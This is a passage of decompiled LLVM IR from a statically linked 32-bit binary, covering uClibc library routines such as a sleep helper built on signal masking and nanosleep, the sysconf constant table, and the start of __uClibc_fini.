dec_label_pc_8053e63.dec_label_pc_8053e63_crit_edge: ; preds = %dec_label_pc_8053e63
  %v0_8053e63.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053e63

dec_label_pc_8053e71:                             ; preds = %dec_label_pc_8053e63
  store i32 %arg1, i32* %stack_var_-24, align 4
  store i32 %v1_8053e6e, i32* %stack_var_-448, align 4
  store i32 %v1_8053e6e, i32* %stack_var_-452, align 4
  %v2_8053e87 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8053e87, i32* @ebx, align 4
  store i32 %v2_8053e87, i32* %stack_var_-460, align 4
  %v4_8053e8f = call i32 @__sigaddset(i32 %v2_8053e87, i32 17, i32 %v1_8053e6e, i32 %v1_8053e6e)
  store i32 %v4_8053e8f, i32* %eax.global-to-local, align 4
  %v2_8053e97 = icmp slt i32 %v4_8053e8f, 0
  br i1 %v2_8053e97, label %dec_label_pc_8053fbf, label %dec_label_pc_8053e9f

dec_label_pc_8053e9f:                             ; preds = %dec_label_pc_8053e71
  store i32 %v4_8053e8f, i32* %stack_var_-448, align 4
  %v2_8053ea0 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8053ea0, i32* @esi, align 4
  store i32 %v2_8053ea0, i32* %stack_var_-452, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8053eab = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8053eab = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8053eab, i32 %v2_8053ea0)
  store i32 %v4_8053eab, i32* %eax.global-to-local, align 4
  %v1_8053eb3 = icmp eq i32 %v4_8053eab, 0
  %v1_8053eb5 = icmp eq i1 %v1_8053eb3, false
  br i1 %v1_8053eb5, label %dec_label_pc_8053fbf, label %dec_label_pc_8053ebb

dec_label_pc_8053ebb:                             ; preds = %dec_label_pc_8053e9f
  store i32 %v4_8053eab, i32* %stack_var_-448, align 4
  store i32 %v4_8053eab, i32* %stack_var_-452, align 4
  store i32 %v2_8053ea0, i32* %stack_var_-460, align 4
  %v4_8053ec0 = call i32 @__sigismember(i32 %v2_8053ea0, i32 17, i32 %v4_8053eab, i32 %v4_8053eab)
  store i32 %v4_8053ec0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8053ecd = icmp eq i32 %v4_8053ec0, 0
  br i1 %v1_8053ecd, label %dec_label_pc_8053ee1.preheader, label %dec_label_pc_8053f89

dec_label_pc_8053ee1.preheader:                   ; preds = %dec_label_pc_8053ebb
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053ed6

dec_label_pc_8053ed6:                             ; preds = %dec_label_pc_8053ed6.dec_label_pc_8053ed6_crit_edge, %dec_label_pc_8053ee1.preheader
  %v0_8053ed6 = phi i32 [ %v15_8053e4d, %dec_label_pc_8053ee1.preheader ], [ %v0_8053ed6.pre, %dec_label_pc_8053ed6.dec_label_pc_8053ed6_crit_edge ]
  %v1_8053ee128 = phi i32 [ 31, %dec_label_pc_8053ee1.preheader ], [ %v1_8053ee1, %dec_label_pc_8053ed6.dec_label_pc_8053ed6_crit_edge ]
  %v2_8053ed6 = mul i32 %v1_8053ee128, 4
  %v3_8053ed6 = add i32 %v2_8053ed6, 292
  %v4_8053ed6 = add i32 %v3_8053ed6, %v0_8053ed6
  %v5_8053ed6 = inttoptr i32 %v4_8053ed6 to i32*
  store i32 0, i32* %v5_8053ed6, align 4
  %v0_8053ee1.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8053ee1 = add i32 %v0_8053ee1.pre, -1
  %v9_8053ee1 = icmp slt i32 %v1_8053ee1, 0
  store i32 %v1_8053ee1, i32* %edx.global-to-local, align 4
  %v1_8053ee2 = icmp eq i1 %v9_8053ee1, false
  br i1 %v1_8053ee2, label %dec_label_pc_8053ed6.dec_label_pc_8053ed6_crit_edge, label %dec_label_pc_8053ee4

dec_label_pc_8053ed6.dec_label_pc_8053ed6_crit_edge: ; preds = %dec_label_pc_8053ed6
  %v0_8053ed6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053ed6

dec_label_pc_8053ee4:                             ; preds = %dec_label_pc_8053ed6
  store i32 0, i32* %stack_var_-448, align 4
  store i32 0, i32* %stack_var_-452, align 4
  store i32 %v2_8053e87, i32* %eax.global-to-local, align 4
  store i32 %v2_8053e87, i32* %stack_var_-460, align 4
  %v4_8053ef0 = call i32 @__sigaddset(i32 %v2_8053e87, i32 17, i32 0, i32 0)
  store i32 %v4_8053ef0, i32* %eax.global-to-local, align 4
  %v2_8053ef8 = icmp slt i32 %v4_8053ef0, 0
  br i1 %v2_8053ef8, label %dec_label_pc_8053fbf, label %dec_label_pc_8053f00

dec_label_pc_8053f00:                             ; preds = %dec_label_pc_8053ee4
  store i32 %v4_8053ef0, i32* %stack_var_-448, align 4
  %v2_8053f01 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8053f01, i32* %eax.global-to-local, align 4
  store i32 %v2_8053f01, i32* %stack_var_-452, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8053f0a = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_8053f01)
  store i32 %v4_8053f0a, i32* %eax.global-to-local, align 4
  %v2_8053f12 = icmp slt i32 %v4_8053f0a, 0
  %v1_8053f14 = icmp eq i1 %v2_8053f12, false
  br i1 %v1_8053f14, label %dec_label_pc_8053f3e, label %dec_label_pc_8053f16

dec_label_pc_8053f16:                             ; preds = %dec_label_pc_8053f00
  %v0_8053f16 = load i32, i32* %stack_var_-460, align 4
  %v1_8053f16 = call i32 @__errno_location(i32 %v0_8053f16)
  store i32 %v1_8053f16, i32* %eax.global-to-local, align 4
  %v1_8053f1b = inttoptr i32 %v1_8053f16 to i32*
  %v2_8053f1b = load i32, i32* %v1_8053f1b, align 4
  store i32 %v2_8053f1b, i32* @esi, align 4
  store i32 %v1_8053f16, i32* @ebx, align 4
  %v0_8053f1f = load i32, i32* @ebp, align 4
  store i32 %v0_8053f1f, i32* %stack_var_-448, align 4
  store i32 0, i32* %stack_var_-452, align 4
  store i32 %v2_8053ea0, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053f2c = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053f2c = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8053f2c, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053f37 = load i32, i32* @esi, align 4
  %v1_8053f37 = load i32, i32* @ebx, align 4
  %v2_8053f37 = inttoptr i32 %v1_8053f37 to i32*
  store i32 %v0_8053f37, i32* %v2_8053f37, align 4
  %v0_8053fcc.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053fc2

dec_label_pc_8053f3e:                             ; preds = %dec_label_pc_8053f00
  %v3_8053f3e = load i32, i32* %stack_var_-420, align 4
  %v12_8053f3e = icmp eq i32 %v3_8053f3e, 1
  store i32 %v2_8053ea0, i32* @ebp, align 4
  %v2_8053f4a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053f4a, i32* @ebx, align 4
  %v1_8053f51 = icmp eq i1 %v12_8053f3e, false
  br i1 %v1_8053f51, label %dec_label_pc_8053f78, label %dec_label_pc_8053f53

dec_label_pc_8053f53:                             ; preds = %dec_label_pc_8053f3e
  %v0_8053f53 = load i32, i32* @edi, align 4
  store i32 %v0_8053f53, i32* %stack_var_-448, align 4
  store i32 %v0_8053f53, i32* %stack_var_-452, align 4
  store i32 %v2_8053f4a, i32* %stack_var_-460, align 4
  %v4_8053f57 = call i32 @nanosleep(i32 %v2_8053f4a, i32 %v2_8053f4a, i32 %v0_8053f53, i32 %v0_8053f53)
  store i32 %v4_8053f57, i32* %eax.global-to-local, align 4
  store i32 %v4_8053f57, i32* @edi, align 4
  %v1_8053f5e = call i32 @__errno_location(i32 %v2_8053f4a)
  store i32 %v1_8053f5e, i32* %eax.global-to-local, align 4
  %v1_8053f66 = inttoptr i32 %v1_8053f5e to i32*
  %v2_8053f66 = load i32, i32* %v1_8053f66, align 4
  store i32 %v2_8053f66, i32* @esi, align 4
  store i32 %v1_8053f5e, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-452, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053f6f = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053f6f = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8053f6f, i32 0)
  store i32 %v4_8053f6f, i32* %eax.global-to-local, align 4
  %v0_8053f74 = load i32, i32* @esi, align 4
  %v1_8053f74 = load i32, i32* @ebx, align 4
  %v2_8053f74 = inttoptr i32 %v1_8053f74 to i32*
  store i32 %v0_8053f74, i32* %v2_8053f74, align 4
  %v0_8053f9e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053f9b

dec_label_pc_8053f78:                             ; preds = %dec_label_pc_8053f3e
  store i32 %v2_8053ea0, i32* %stack_var_-448, align 4
  store i32 0, i32* %stack_var_-452, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053f7e = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053f7e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8053f7e, i32 0)
  store i32 %v4_8053f7e, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  store i32 %v2_8053ea0, i32* @ecx, align 4
  %v2_8053f94.pre = load i32, i32* %stack_var_-452, align 4
  %v3_8053f94.pre = load i32, i32* %stack_var_-448, align 4
  br label %dec_label_pc_8053f94

dec_label_pc_8053f89:                             ; preds = %dec_label_pc_8053ebb
  store i32 %v4_8053ec0, i32* %stack_var_-448, align 4
  store i32 %v4_8053ec0, i32* %stack_var_-452, align 4
  %v2_8053f8b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053f8b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f94

dec_label_pc_8053f94:                             ; preds = %dec_label_pc_8053f78, %dec_label_pc_8053f89
  %storemerge3.pre-phi = phi i32 [ %v2_8053f4a, %dec_label_pc_8053f78 ], [ %v2_8053f8b, %dec_label_pc_8053f89 ]
  %v3_8053f94 = phi i32 [ %v3_8053f94.pre, %dec_label_pc_8053f78 ], [ %v4_8053ec0, %dec_label_pc_8053f89 ]
  %v2_8053f94 = phi i32 [ %v2_8053f94.pre, %dec_label_pc_8053f78 ], [ %v4_8053ec0, %dec_label_pc_8053f89 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8053f94 = call i32 @nanosleep(i32 %storemerge3.pre-phi, i32 %storemerge3.pre-phi, i32 %v2_8053f94, i32 %v3_8053f94)
  store i32 %v4_8053f94, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f9b

dec_label_pc_8053f9b:                             ; preds = %dec_label_pc_8053f53, %dec_label_pc_8053f94
  %v0_8053f9e = phi i32 [ %v0_8053f9e.pre, %dec_label_pc_8053f53 ], [ %v4_8053f94, %dec_label_pc_8053f94 ]
  %v1_8053f9e = icmp eq i32 %v0_8053f9e, 0
  br i1 %v1_8053f9e, label %dec_label_pc_8053fbb, label %dec_label_pc_8053fa2

dec_label_pc_8053fa2:                             ; preds = %dec_label_pc_8053f9b
  %v4_8053fb2 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8053fb2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053fc2

dec_label_pc_8053fbb:                             ; preds = %entry, %dec_label_pc_8053f9b
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053fc2

dec_label_pc_8053fbf:                             ; preds = %dec_label_pc_8053ee4, %dec_label_pc_8053e9f, %dec_label_pc_8053e71
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053fc2

dec_label_pc_8053fc2:                             ; preds = %dec_label_pc_8053fbb, %dec_label_pc_8053fa2, %dec_label_pc_8053f16, %dec_label_pc_8053fbf
  %v0_8053fcc = phi i32 [ 0, %dec_label_pc_8053fbb ], [ %v4_8053fb2, %dec_label_pc_8053fa2 ], [ %v0_8053fcc.pre, %dec_label_pc_8053f16 ], [ -1, %dec_label_pc_8053fbf ]
  store i32 %v0_8053e4c, i32* @ebx, align 4
  store i32 %v0_8053e4b, i32* @esi, align 4
  store i32 %v0_8053e4a, i32* @edi, align 4
  store i32 %v0_8053e44, i32* @ebp, align 4
  ret i32 %v0_8053fcc

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 2, 0, 1 }
  uselistorder i32 %v1_8053f5e, { 1, 0, 2 }
  uselistorder i32 %v2_8053f4a, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8053ee1, { 2, 1, 0 }
  uselistorder i32 %v4_8053ec0, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v4_8053eab, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v2_8053ea0, { 0, 3, 4, 2, 6, 5, 1, 7, 8 }
  uselistorder i32 %v2_8053e87, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8053e6e, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32* %stack_var_-448, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %stack_var_-452, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23 }
  uselistorder i32 (i32, i32, i32, i32)* @nanosleep, { 2, 1, 3, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 9, 10, 11, 12, 14, 6, 1, 2, 4, 5, 15, 7, 8, 3, 13, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053fc2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053fbb, { 1, 0 }
  uselistorder label %dec_label_pc_8053f9b, { 1, 0 }
  uselistorder label %dec_label_pc_8053f94, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_8053fef [
    i32 0, label %dec_label_pc_8053fff
    i32 1, label %dec_label_pc_80540e4
    i32 2, label %dec_label_pc_8054009
    i32 3, label %dec_label_pc_8054013
    i32 4, label %dec_label_pc_805401d
    i32 5, label %dec_label_pc_80540b3
    i32 6, label %dec_label_pc_8054025
    i32 7, label %dec_label_pc_8053fe5
    i32 8, label %dec_label_pc_8053fe5
    i32 9, label %dec_label_pc_8053fe5
    i32 10, label %dec_label_pc_8053fe5
    i32 11, label %dec_label_pc_8053fe5
    i32 12, label %dec_label_pc_8053fe5
    i32 13, label %dec_label_pc_8053fe5
    i32 14, label %dec_label_pc_8053fe5
    i32 15, label %dec_label_pc_8053fe5
    i32 16, label %dec_label_pc_8053fe5
    i32 17, label %dec_label_pc_8053fe5
    i32 18, label %dec_label_pc_8053fe5
    i32 19, label %dec_label_pc_8053fe5
    i32 20, label %dec_label_pc_8053fe5
    i32 21, label %dec_label_pc_8053fe5
    i32 22, label %dec_label_pc_8053fe5
    i32 23, label %dec_label_pc_80540e4
    i32 24, label %dec_label_pc_80540e4
    i32 25, label %dec_label_pc_80540f0
    i32 26, label %dec_label_pc_80540c1
    i32 27, label %dec_label_pc_80540e4
    i32 28, label %dec_label_pc_8054037
    i32 29, label %dec_label_pc_80540ba
    i32 30, label %dec_label_pc_805402f
    i32 31, label %dec_label_pc_80540cf
    i32 32, label %dec_label_pc_80540e4
    i32 33, label %dec_label_pc_80540e4
    i32 34, label %dec_label_pc_80540e4
    i32 35, label %dec_label_pc_80540c8
    i32 36, label %dec_label_pc_80540f7
    i32 37, label %dec_label_pc_80540fe
    i32 38, label %dec_label_pc_80540f7
    i32 39, label %dec_label_pc_8054041
    i32 40, label %dec_label_pc_8054105
    i32 41, label %dec_label_pc_80540e4
    i32 42, label %dec_label_pc_80540cf
    i32 43, label %dec_label_pc_80540fe
    i32 44, label %dec_label_pc_805410c
    i32 45, label %dec_label_pc_80540fe
    i32 46, label %dec_label_pc_80540ba
    i32 47, label %dec_label_pc_80540ba
    i32 48, label %dec_label_pc_80540ba
    i32 49, label %dec_label_pc_80540e4
    i32 50, label %dec_label_pc_80540e4
    i32 51, label %dec_label_pc_80540ba
    i32 52, label %dec_label_pc_80540ba
    i32 53, label %dec_label_pc_80540e4
    i32 54, label %dec_label_pc_80540e4
    i32 55, label %dec_label_pc_80540e4
    i32 56, label %dec_label_pc_80540e4
    i32 57, label %dec_label_pc_80540e4
    i32 58, label %dec_label_pc_80540e4
    i32 59, label %dec_label_pc_80540e4
    i32 60, label %dec_label_pc_80540e4
    i32 61, label %dec_label_pc_80540e4
    i32 62, label %dec_label_pc_80540e4
    i32 63, label %dec_label_pc_80540e4
    i32 64, label %dec_label_pc_80540e4
    i32 65, label %dec_label_pc_80540e4
    i32 66, label %dec_label_pc_80540e4
    i32 67, label %dec_label_pc_8053fe5
    i32 68, label %dec_label_pc_8053fe5
    i32 69, label %dec_label_pc_80540c8
    i32 70, label %dec_label_pc_80540c8
    i32 71, label %dec_label_pc_80540c8
    i32 72, label %dec_label_pc_80540cf
    i32 73, label %dec_label_pc_80540d6
    i32 74, label %dec_label_pc_80540dd
    i32 75, label %dec_label_pc_805404b
    i32 76, label %dec_label_pc_80540dd
    i32 77, label %dec_label_pc_8053fe5
    i32 78, label %dec_label_pc_8053fe5
    i32 79, label %dec_label_pc_8053fe5
    i32 80, label %dec_label_pc_8053fe5
    i32 81, label %dec_label_pc_8053fe5
    i32 82, label %dec_label_pc_8053fe5
    i32 83, label %dec_label_pc_8053fe5
    i32 84, label %dec_label_pc_8053fe5
    i32 85, label %dec_label_pc_80540e4
    i32 86, label %dec_label_pc_80540e4
    i32 87, label %dec_label_pc_80540c1
    i32 88, label %dec_label_pc_8054055
    i32 89, label %dec_label_pc_805405f
    i32 90, label %dec_label_pc_80540d6
    i32 91, label %dec_label_pc_8053fe5
    i32 92, label %dec_label_pc_8053fe5
    i32 93, label %dec_label_pc_8053fe5
    i32 94, label %dec_label_pc_8053fe5
    i32 95, label %dec_label_pc_80540ba
    i32 96, label %dec_label_pc_80540e4
    i32 97, label %dec_label_pc_80540e4
    i32 98, label %dec_label_pc_8053fe5
    i32 99, label %dec_label_pc_8053fe5
    i32 100, label %dec_label_pc_8053fe5
    i32 101, label %dec_label_pc_8054069
    i32 102, label %dec_label_pc_80540ac
    i32 103, label %dec_label_pc_80540e9
    i32 104, label %dec_label_pc_80540c1
    i32 105, label %dec_label_pc_8054073
    i32 106, label %dec_label_pc_80540cf
    i32 107, label %dec_label_pc_80540cf
    i32 108, label %dec_label_pc_80540b3
    i32 109, label %dec_label_pc_80540f0
    i32 110, label %dec_label_pc_805410c
    i32 111, label %dec_label_pc_80540ac
    i32 112, label %dec_label_pc_80540e9
    i32 113, label %dec_label_pc_805410c
    i32 114, label %dec_label_pc_805407d
    i32 115, label %dec_label_pc_8054105
    i32 116, label %dec_label_pc_80540e4
    i32 117, label %dec_label_pc_80540e4
    i32 118, label %dec_label_pc_8054087
    i32 119, label %dec_label_pc_8054091
    i32 120, label %dec_label_pc_80540fe
    i32 121, label %dec_label_pc_80540c1
    i32 122, label %dec_label_pc_80540c1
    i32 123, label %dec_label_pc_80540c1
    i32 124, label %dec_label_pc_80540c1
    i32 125, label %dec_label_pc_8053fe5
    i32 126, label %dec_label_pc_8053fe5
    i32 127, label %dec_label_pc_80540e4
    i32 128, label %dec_label_pc_80540e4
    i32 129, label %dec_label_pc_8053fe5
    i32 130, label %dec_label_pc_8053fe5
    i32 131, label %dec_label_pc_80540e4
    i32 149, label %dec_label_pc_8054098
  ]

dec_label_pc_8053fe5:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_8053fef:                             ; preds = %entry
  %v1_8053fef = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8053ff4 = inttoptr i32 %v1_8053fef to i32*
  store i32 22, i32* %v1_8053ff4, align 4
  br label %dec_label_pc_80540e4

dec_label_pc_8053fff:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_8054009:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_8054013:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_805401d:                             ; preds = %entry
  %v0_8054020 = call i32 @getdtablesize()
  br label %dec_label_pc_8054025

dec_label_pc_8054025:                             ; preds = %entry, %dec_label_pc_805401d
  br label %dec_label_pc_8054111

dec_label_pc_805402f:                             ; preds = %entry
  %v1_8054032 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8054037

dec_label_pc_8054037:                             ; preds = %entry, %dec_label_pc_805402f
  br label %dec_label_pc_8054111

dec_label_pc_8054041:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_805404b:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_8054055:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_805405f:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_8054069:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_8054073:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_805407d:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_8054087:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_8054091:                             ; preds = %entry
  br label %dec_label_pc_8054111

dec_label_pc_8054098:                             ; preds = %entry
  %v5_805409e = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80540a6 = icmp slt i32 %v5_805409e, 0
  %v1_80540a8 = icmp eq i1 %v2_80540a6, false
  br i1 %v1_80540a8, label %dec_label_pc_80540ba, label %dec_label_pc_80540e4

dec_label_pc_80540ac:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_80540b3:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_80540ba:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8054098
  br label %dec_label_pc_8054111

dec_label_pc_80540c1:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_80540c8:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_80540cf:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_80540d6:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_80540dd:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_80540e4:                             ; preds = %dec_label_pc_8054098, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8053fef
  br label %dec_label_pc_8054111

dec_label_pc_80540e9:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_80540f0:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_80540f7:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_80540fe:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_8054105:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_805410c:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8054111

dec_label_pc_8054111:                             ; preds = %dec_label_pc_8054105, %dec_label_pc_80540fe, %dec_label_pc_80540f7, %dec_label_pc_80540f0, %dec_label_pc_80540e9, %dec_label_pc_80540dd, %dec_label_pc_80540d6, %dec_label_pc_80540cf, %dec_label_pc_80540c8, %dec_label_pc_80540c1, %dec_label_pc_80540b3, %dec_label_pc_80540ac, %dec_label_pc_80540ba, %dec_label_pc_8054091, %dec_label_pc_8054087, %dec_label_pc_805407d, %dec_label_pc_8054073, %dec_label_pc_8054069, %dec_label_pc_805405f, %dec_label_pc_8054055, %dec_label_pc_805404b, %dec_label_pc_8054041, %dec_label_pc_8054037, %dec_label_pc_8054025, %dec_label_pc_8054013, %dec_label_pc_8054009, %dec_label_pc_8053fff, %dec_label_pc_8053fe5, %dec_label_pc_80540e4, %dec_label_pc_805410c
  %v0_8054114 = phi i32 [ 255, %dec_label_pc_8054105 ], [ 2048, %dec_label_pc_80540fe ], [ 99, %dec_label_pc_80540f7 ], [ 20, %dec_label_pc_80540f0 ], [ -128, %dec_label_pc_80540e9 ], [ 1024, %dec_label_pc_80540dd ], [ 4, %dec_label_pc_80540d6 ], [ 32, %dec_label_pc_80540cf ], [ 256, %dec_label_pc_80540c8 ], [ 2147483647, %dec_label_pc_80540c1 ], [ 16, %dec_label_pc_80540b3 ], [ 127, %dec_label_pc_80540ac ], [ 200112, %dec_label_pc_80540ba ], [ 9, %dec_label_pc_8054091 ], [ 65535, %dec_label_pc_8054087 ], [ -32768, %dec_label_pc_805407d ], [ -2147483648, %dec_label_pc_8054073 ], [ 8, %dec_label_pc_8054069 ], [ 500, %dec_label_pc_805405f ], [ 4096, %dec_label_pc_8054055 ], [ 16384, %dec_label_pc_805404b ], [ 1000, %dec_label_pc_8054041 ], [ 32768, %dec_label_pc_8054037 ], [ 6, %dec_label_pc_8054025 ], [ 65536, %dec_label_pc_8054013 ], [ 100, %dec_label_pc_8054009 ], [ 131072, %dec_label_pc_8053fff ], [ 1, %dec_label_pc_8053fe5 ], [ -1, %dec_label_pc_80540e4 ], [ 32767, %dec_label_pc_805410c ]
  ret i32 %v0_8054114

; uselistorder directives
  uselistorder i32 16384, { 1, 0 }
  uselistorder i32 (i32)* @__GI_getpagesize, { 4, 2, 1, 0, 3 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 110, { 2, 0, 1, 3 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 95, { 4, 1, 0, 2, 3 }
  uselistorder i32 76, { 0, 3, 4, 5, 6, 2, 1, 7 }
  uselistorder i32 66, { 0, 11, 9, 2, 3, 4, 12, 5, 10, 1, 6, 7, 8 }
  uselistorder i32 65, { 2, 8, 9, 10, 5, 6, 7, 4, 1, 0, 3 }
  uselistorder i32 63, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 38, { 2, 7, 0, 1, 3, 4, 5, 6 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 19, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_8054111, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80540e4, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80540ba, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8054037, { 1, 0 }
  uselistorder label %dec_label_pc_8054025, { 1, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8067648.267 to i32)
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054120 = load i32, i32* @ebx, align 4
  store i32 %v0_8054120, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e568.268 to i32), i32 -134604136), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e568.268 to i32), i32 -134604136), i32 2), i32 0), label %dec_label_pc_8054134, label %dec_label_pc_8054141

dec_label_pc_8054134:                             ; preds = %entry, %dec_label_pc_8054134
  %v1_805413b8 = phi i32 [ %v1_805413b, %dec_label_pc_8054134 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e568.268 to i32), i32 -134604136), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_805413b.269 to i32), i32* %stack_var_-16, align 4
  %v5_8054134 = mul i32 %v1_805413b8, 4
  %v6_8054134 = add i32 %v5_8054134, ptrtoint (i32* @global_var_805e568.268 to i32)
